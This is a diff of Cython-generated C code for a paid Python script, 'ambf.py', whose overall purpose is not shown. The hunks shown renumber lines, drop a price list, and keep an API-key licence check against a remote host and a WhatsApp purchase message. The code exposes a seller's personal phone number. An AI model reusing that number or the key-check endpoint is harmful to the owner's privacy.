+        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_requests); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 710, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_8);
-        __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_get); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 717, __pyx_L5_except_error)
+        __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_get); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 710, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_10);
         __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-        __pyx_t_8 = PyNumber_Add(__pyx_kp_s_https_ngepetonline_000webhostapp, __pyx_v_key); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 717, __pyx_L5_except_error)
+        __pyx_t_8 = PyNumber_Add(__pyx_kp_s_https_ngepetonline_000webhostapp, __pyx_v_key); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 710, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_8);
         __pyx_t_14 = NULL;
         if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
@@ -22070,10 +21829,10 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
         __pyx_t_9 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_14, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_8);
         __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
         __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-        if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 717, __pyx_L5_except_error)
+        if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 710, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_9);
         __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-        __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_json); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 717, __pyx_L5_except_error)
+        __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_json); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 710, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_10);
         __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
         __pyx_t_9 = NULL;
@@ -22088,37 +21847,37 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
         }
         __pyx_t_13 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
         __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
-        if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 717, __pyx_L5_except_error)
+        if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 710, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
         __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
         __pyx_v_cek = __pyx_t_13;
         __pyx_t_13 = 0;
 
-        /* "ambf.py":718
+        /* "ambf.py":711
  * 			key = input("\n [+] Masukan Api Key : ")
  * 			cek = requests.get("https://ngepetonline.000webhostapp.com/chek.php?project=anggakurniawan&apikey="+key).json()
  * 			if cek["status"] == "error":             # <<<<<<<<<<<<<<
  * 				exit(" [!] api key tidak terdaftar")
  * 			elif cek["status"] == "expired":
  */
-        __pyx_t_13 = __Pyx_PyObject_Dict_GetItem(__pyx_v_cek, __pyx_n_s_status_2); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 718, __pyx_L5_except_error)
+        __pyx_t_13 = __Pyx_PyObject_Dict_GetItem(__pyx_v_cek, __pyx_n_s_status_2); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 711, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
-        __pyx_t_12 = (__Pyx_PyString_Equals(__pyx_t_13, __pyx_n_s_error, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 718, __pyx_L5_except_error)
+        __pyx_t_12 = (__Pyx_PyString_Equals(__pyx_t_13, __pyx_n_s_error, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 711, __pyx_L5_except_error)
         __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
         if (__pyx_t_12) {
 
-          /* "ambf.py":719
+          /* "ambf.py":712
  * 			cek = requests.get("https://ngepetonline.000webhostapp.com/chek.php?project=anggakurniawan&apikey="+key).json()
  * 			if cek["status"] == "error":
  * 				exit(" [!] api key tidak terdaftar")             # <<<<<<<<<<<<<<
  * 			elif cek["status"] == "expired":
  * 				exit(" [!] api key kamu sudah kadaluwarsa")
  */
-          __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__69, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 719, __pyx_L5_except_error)
+          __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__69, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 712, __pyx_L5_except_error)
           __Pyx_GOTREF(__pyx_t_13);
           __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
 
-          /* "ambf.py":718
+          /* "ambf.py":711
  * 			key = input("\n [+] Masukan Api Key : ")
  * 			cek = requests.get("https://ngepetonline.000webhostapp.com/chek.php?project=anggakurniawan&apikey="+key).json()
  * 			if cek["status"] == "error":             # <<<<<<<<<<<<<<
@@ -22128,31 +21887,31 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
           goto __pyx_L18;
         }
 
-        /* "ambf.py":720
+        /* "ambf.py":713
  * 			if cek["status"] == "error":
  * 				exit(" [!] api key tidak terdaftar")
  * 			elif cek["status"] == "expired":             # <<<<<<<<<<<<<<
  * 				exit(" [!] api key kamu sudah kadaluwarsa")
  * 			else:
  */
-        __pyx_t_13 = __Pyx_PyObject_Dict_GetItem(__pyx_v_cek, __pyx_n_s_status_2); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 720, __pyx_L5_except_error)
+        __pyx_t_13 = __Pyx_PyObject_Dict_GetItem(__pyx_v_cek, __pyx_n_s_status_2); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 713, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
-        __pyx_t_12 = (__Pyx_PyString_Equals(__pyx_t_13, __pyx_n_s_expired, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 720, __pyx_L5_except_error)
+        __pyx_t_12 = (__Pyx_PyString_Equals(__pyx_t_13, __pyx_n_s_expired, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 713, __pyx_L5_except_error)
         __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
         if (__pyx_t_12) {
 
-          /* "ambf.py":721
+          /* "ambf.py":714
  * 				exit(" [!] api key tidak terdaftar")
  * 			elif cek["status"] == "expired":
  * 				exit(" [!] api key kamu sudah kadaluwarsa")             # <<<<<<<<<<<<<<
  * 			else:
  * 				open(".__apikey__.txt","w").write(key)
  */
-          __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__70, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 721, __pyx_L5_except_error)
+          __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__70, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 714, __pyx_L5_except_error)
           __Pyx_GOTREF(__pyx_t_13);
           __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
 
-          /* "ambf.py":720
+          /* "ambf.py":713
  * 			if cek["status"] == "error":
  * 				exit(" [!] api key tidak terdaftar")
  * 			elif cek["status"] == "expired":             # <<<<<<<<<<<<<<
@@ -22162,7 +21921,7 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
           goto __pyx_L18;
         }
 
-        /* "ambf.py":723
+        /* "ambf.py":716
  * 				exit(" [!] api key kamu sudah kadaluwarsa")
  * 			else:
  * 				open(".__apikey__.txt","w").write(key)             # <<<<<<<<<<<<<<
@@ -22170,9 +21929,9 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
  * 				time.sleep(1.5)
  */
         /*else*/ {
-          __pyx_t_10 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__61, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 723, __pyx_L5_except_error)
+          __pyx_t_10 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__61, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 716, __pyx_L5_except_error)
           __Pyx_GOTREF(__pyx_t_10);
-          __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_write); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 723, __pyx_L5_except_error)
+          __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_write); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 716, __pyx_L5_except_error)
           __Pyx_GOTREF(__pyx_t_9);
           __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
           __pyx_t_10 = NULL;
@@ -22187,30 +21946,30 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
           }
           __pyx_t_13 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_9, __pyx_t_10, __pyx_v_key) : __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_v_key);
           __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
-          if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 723, __pyx_L5_except_error)
+          if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 716, __pyx_L5_except_error)
           __Pyx_GOTREF(__pyx_t_13);
           __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
           __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
 
-          /* "ambf.py":724
+          /* "ambf.py":717
  * 			else:
  * 				open(".__apikey__.txt","w").write(key)
  * 				print(" [!] Api Key Terdaftar")             # <<<<<<<<<<<<<<
  * 				time.sleep(1.5)
  * 				return make()
  */
-          if (__Pyx_PrintOne(0, __pyx_kp_s_Api_Key_Terdaftar) < 0) __PYX_ERR(0, 724, __pyx_L5_except_error)
+          if (__Pyx_PrintOne(0, __pyx_kp_s_Api_Key_Terdaftar) < 0) __PYX_ERR(0, 717, __pyx_L5_except_error)
 
-          /* "ambf.py":725
+          /* "ambf.py":718
  * 				open(".__apikey__.txt","w").write(key)
  * 				print(" [!] Api Key Terdaftar")
  * 				time.sleep(1.5)             # <<<<<<<<<<<<<<
  * 				return make()
  * 		elif ask in ["3", "03"]:
  */
-          __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_time); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 725, __pyx_L5_except_error)
+          __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_time); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 718, __pyx_L5_except_error)
           __Pyx_GOTREF(__pyx_t_9);
-          __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_sleep); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 725, __pyx_L5_except_error)
+          __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_sleep); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 718, __pyx_L5_except_error)
           __Pyx_GOTREF(__pyx_t_10);
           __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
           __pyx_t_9 = NULL;
@@ -22225,20 +21984,20 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
           }
           __pyx_t_13 = (__pyx_t_9) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_9, __pyx_float_1_5) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_float_1_5);
           __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
-          if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 725, __pyx_L5_except_error)
+          if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 718, __pyx_L5_except_error)
           __Pyx_GOTREF(__pyx_t_13);
           __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
           __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
 
-          /* "ambf.py":726
+          /* "ambf.py":719
  * 				print(" [!] Api Key Terdaftar")
  * 				time.sleep(1.5)
  * 				return make()             # <<<<<<<<<<<<<<
  * 		elif ask in ["3", "03"]:
- * 			print("\n [ List Harga Script Premium ]\n")
+ * 			print("\n [ Isi Data Pendaftaran Api Key ]\n")
  */
           __Pyx_XDECREF(__pyx_r);
-          __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_make); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 726, __pyx_L5_except_error)
+          __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_make); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 719, __pyx_L5_except_error)
           __Pyx_GOTREF(__pyx_t_10);
           __pyx_t_9 = NULL;
           if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
@@ -22252,7 +22011,7 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
           }
           __pyx_t_13 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
           __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
-          if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 726, __pyx_L5_except_error)
+          if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 719, __pyx_L5_except_error)
           __Pyx_GOTREF(__pyx_t_13);
           __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
           __pyx_r = __pyx_t_13;
@@ -22264,7 +22023,7 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
         }
         __pyx_L18:;
 
-        /* "ambf.py":715
+        /* "ambf.py":708
  * 			input("\n [+] Kembali Ke Menu Awal")
  * 			main()
  * 		elif ask in ["2", "02"]:             # <<<<<<<<<<<<<<
@@ -22274,110 +22033,83 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
         goto __pyx_L11;
       }
 
-      /* "ambf.py":727
+      /* "ambf.py":720
  * 				time.sleep(1.5)
  * 				return make()
  * 		elif ask in ["3", "03"]:             # <<<<<<<<<<<<<<
- * 			print("\n [ List Harga Script Premium ]\n")
- * 			print(" [+] Durasi 1 Bulan Harga Rp 20.000")
+ * 			print("\n [ Isi Data Pendaftaran Api Key ]\n")
+ * 			nama = input(" [+] Nama   : ")
  */
       __Pyx_INCREF(__pyx_v_ask);
       __pyx_t_13 = __pyx_v_ask;
-      __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_t_13, __pyx_kp_s_3, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 727, __pyx_L5_except_error)
+      __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_t_13, __pyx_kp_s_3, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 720, __pyx_L5_except_error)
       if (!__pyx_t_11) {
       } else {
         __pyx_t_12 = __pyx_t_11;
         goto __pyx_L19_bool_binop_done;
       }
-      __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_t_13, __pyx_kp_s_03, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 727, __pyx_L5_except_error)
+      __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_t_13, __pyx_kp_s_03, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 720, __pyx_L5_except_error)
       __pyx_t_12 = __pyx_t_11;
       __pyx_L19_bool_binop_done:;
       __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
       __pyx_t_11 = (__pyx_t_12 != 0);
       if (__pyx_t_11) {
 
-        /* "ambf.py":728
+        /* "ambf.py":721
  * 				return make()
  * 		elif ask in ["3", "03"]:
- * 			print("\n [ List Harga Script Premium ]\n")             # <<<<<<<<<<<<<<
- * 			print(" [+] Durasi 1 Bulan Harga Rp 20.000")
- * 			print(" [+] Durasi Unlimited Harga Rp 50.000")
- */
-        if (__Pyx_PrintOne(0, __pyx_kp_s_List_Harga_Script_Premium) < 0) __PYX_ERR(0, 728, __pyx_L5_except_error)
-
-        /* "ambf.py":729
- * 		elif ask in ["3", "03"]:
- * 			print("\n [ List Harga Script Premium ]\n")
- * 			print(" [+] Durasi 1 Bulan Harga Rp 20.000")             # <<<<<<<<<<<<<<
- * 			print(" [+] Durasi Unlimited Harga Rp 50.000")
- * 			print("\n [ Isi Data Pendaftaran Api Key ]\n")
- */
-        if (__Pyx_PrintOne(0, __pyx_kp_s_Durasi_1_Bulan_Harga_Rp_20_000) < 0) __PYX_ERR(0, 729, __pyx_L5_except_error)
-
-        /* "ambf.py":730
- * 			print("\n [ List Harga Script Premium ]\n")
- * 			print(" [+] Durasi 1 Bulan Harga Rp 20.000")
- * 			print(" [+] Durasi Unlimited Harga Rp 50.000")             # <<<<<<<<<<<<<<
- * 			print("\n [ Isi Data Pendaftaran Api Key ]\n")
- * 			nama = input(" [+] Nama   : ")
- */
-        if (__Pyx_PrintOne(0, __pyx_kp_s_Durasi_Unlimited_Harga_Rp_50_00) < 0) __PYX_ERR(0, 730, __pyx_L5_except_error)
-
-        /* "ambf.py":731
- * 			print(" [+] Durasi 1 Bulan Harga Rp 20.000")
- * 			print(" [+] Durasi Unlimited Harga Rp 50.000")
  * 			print("\n [ Isi Data Pendaftaran Api Key ]\n")             # <<<<<<<<<<<<<<
  * 			nama = input(" [+] Nama   : ")
  * 			email = input(" [+] Email  : ")
  */
-        if (__Pyx_PrintOne(0, __pyx_kp_s_Isi_Data_Pendaftaran_Api_Key) < 0) __PYX_ERR(0, 731, __pyx_L5_except_error)
+        if (__Pyx_PrintOne(0, __pyx_kp_s_Isi_Data_Pendaftaran_Api_Key) < 0) __PYX_ERR(0, 721, __pyx_L5_except_error)
 
-        /* "ambf.py":732
- * 			print(" [+] Durasi Unlimited Harga Rp 50.000")
+        /* "ambf.py":722
+ * 		elif ask in ["3", "03"]:
  * 			print("\n [ Isi Data Pendaftaran Api Key ]\n")
  * 			nama = input(" [+] Nama   : ")             # <<<<<<<<<<<<<<
  * 			email = input(" [+] Email  : ")
  * 			durasi = input(" [+] Durasi : ")
  */
-        __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__71, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 732, __pyx_L5_except_error)
+        __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__71, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 722, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
         __pyx_v_nama = __pyx_t_13;
         __pyx_t_13 = 0;
 
-        /* "ambf.py":733
+        /* "ambf.py":723
  * 			print("\n [ Isi Data Pendaftaran Api Key ]\n")
  * 			nama = input(" [+] Nama   : ")
  * 			email = input(" [+] Email  : ")             # <<<<<<<<<<<<<<
  * 			durasi = input(" [+] Durasi : ")
  * 			apikey = open(".apikey", "r").read()
  */
-        __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__72, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 733, __pyx_L5_except_error)
+        __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__72, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 723, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
         __pyx_v_email = __pyx_t_13;
         __pyx_t_13 = 0;
 
-        /* "ambf.py":734
+        /* "ambf.py":724
  * 			nama = input(" [+] Nama   : ")
  * 			email = input(" [+] Email  : ")
  * 			durasi = input(" [+] Durasi : ")             # <<<<<<<<<<<<<<
  * 			apikey = open(".apikey", "r").read()
  * 			url_wa = "https://api.whatsapp.com/send?phone=6285864653276&text="
  */
-        __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__73, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 734, __pyx_L5_except_error)
+        __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__73, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 724, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
         __pyx_v_durasi = __pyx_t_13;
         __pyx_t_13 = 0;
 
-        /* "ambf.py":735
+        /* "ambf.py":725
  * 			email = input(" [+] Email  : ")
  * 			durasi = input(" [+] Durasi : ")
  * 			apikey = open(".apikey", "r").read()             # <<<<<<<<<<<<<<
  * 			url_wa = "https://api.whatsapp.com/send?phone=6285864653276&text="
  * 			tks = "hello admin, saya ingin beli script premium\n\n"+"[+] Nama : "+nama+"\n[+] Email : "+email+"\n[+] Durasi : "+durasi+"\n[+] Api Key : "+apikey
  */
-        __pyx_t_10 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__66, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 735, __pyx_L5_except_error)
+        __pyx_t_10 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__66, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 725, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_10);
-        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_read); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 735, __pyx_L5_except_error)
+        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_read); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 725, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_9);
         __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
         __pyx_t_10 = NULL;
@@ -22392,13 +22124,13 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
         }
         __pyx_t_13 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
         __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
-        if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 735, __pyx_L5_except_error)
+        if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 725, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
         __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
         __pyx_v_apikey = __pyx_t_13;
         __pyx_t_13 = 0;
 
-        /* "ambf.py":736
+        /* "ambf.py":726
  * 			durasi = input(" [+] Durasi : ")
  * 			apikey = open(".apikey", "r").read()
  * 			url_wa = "https://api.whatsapp.com/send?phone=6285864653276&text="             # <<<<<<<<<<<<<<
@@ -22408,52 +22140,52 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
         __Pyx_INCREF(__pyx_kp_s_https_api_whatsapp_com_send_phon);
         __pyx_v_url_wa = __pyx_kp_s_https_api_whatsapp_com_send_phon;
 
-        /* "ambf.py":737
+        /* "ambf.py":727
  * 			apikey = open(".apikey", "r").read()
  * 			url_wa = "https://api.whatsapp.com/send?phone=6285864653276&text="
  * 			tks = "hello admin, saya ingin beli script premium\n\n"+"[+] Nama : "+nama+"\n[+] Email : "+email+"\n[+] Durasi : "+durasi+"\n[+] Api Key : "+apikey             # <<<<<<<<<<<<<<
  * 			subprocess.check_output(["am", "start", url_wa+quote(tks)])
  * 		else:
  */
-        __pyx_t_13 = PyNumber_Add(__pyx_kp_s_hello_admin_saya_ingin_beli_scri, __pyx_kp_s_Nama_2); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 737, __pyx_L5_except_error)
+        __pyx_t_13 = PyNumber_Add(__pyx_kp_s_hello_admin_saya_ingin_beli_scri, __pyx_kp_s_Nama_2); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 727, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
-        __pyx_t_9 = PyNumber_Add(__pyx_t_13, __pyx_v_nama); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 737, __pyx_L5_except_error)
+        __pyx_t_9 = PyNumber_Add(__pyx_t_13, __pyx_v_nama); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 727, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_9);
         __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
-        __pyx_t_13 = PyNumber_Add(__pyx_t_9, __pyx_kp_s_Email_2); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 737, __pyx_L5_except_error)
+        __pyx_t_13 = PyNumber_Add(__pyx_t_9, __pyx_kp_s_Email_2); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 727, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
         __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
-        __pyx_t_9 = PyNumber_Add(__pyx_t_13, __pyx_v_email); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 737, __pyx_L5_except_error)
+        __pyx_t_9 = PyNumber_Add(__pyx_t_13, __pyx_v_email); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 727, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_9);
         __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
-        __pyx_t_13 = PyNumber_Add(__pyx_t_9, __pyx_kp_s_Durasi_2); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 737, __pyx_L5_except_error)
+        __pyx_t_13 = PyNumber_Add(__pyx_t_9, __pyx_kp_s_Durasi_2); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 727, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
         __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
-        __pyx_t_9 = PyNumber_Add(__pyx_t_13, __pyx_v_durasi); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 737, __pyx_L5_except_error)
+        __pyx_t_9 = PyNumber_Add(__pyx_t_13, __pyx_v_durasi); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 727, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_9);
         __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
-        __pyx_t_13 = PyNumber_Add(__pyx_t_9, __pyx_kp_s_Api_Key); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 737, __pyx_L5_except_error)
+        __pyx_t_13 = PyNumber_Add(__pyx_t_9, __pyx_kp_s_Api_Key); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 727, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
         __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
-        __pyx_t_9 = PyNumber_Add(__pyx_t_13, __pyx_v_apikey); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 737, __pyx_L5_except_error)
+        __pyx_t_9 = PyNumber_Add(__pyx_t_13, __pyx_v_apikey); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 727, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_9);
         __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
         __pyx_v_tks = __pyx_t_9;
         __pyx_t_9 = 0;
 
-        /* "ambf.py":738
+        /* "ambf.py":728
  * 			url_wa = "https://api.whatsapp.com/send?phone=6285864653276&text="
  * 			tks = "hello admin, saya ingin beli script premium\n\n"+"[+] Nama : "+nama+"\n[+] Email : "+email+"\n[+] Durasi : "+durasi+"\n[+] Api Key : "+apikey
  * 			subprocess.check_output(["am", "start", url_wa+quote(tks)])             # <<<<<<<<<<<<<<
  * 		else:
  * 			main()
  */
-        __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_subprocess); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 738, __pyx_L5_except_error)
+        __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_subprocess); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 728, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
-        __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_check_output); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 738, __pyx_L5_except_error)
+        __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_check_output); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 728, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_10);
         __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
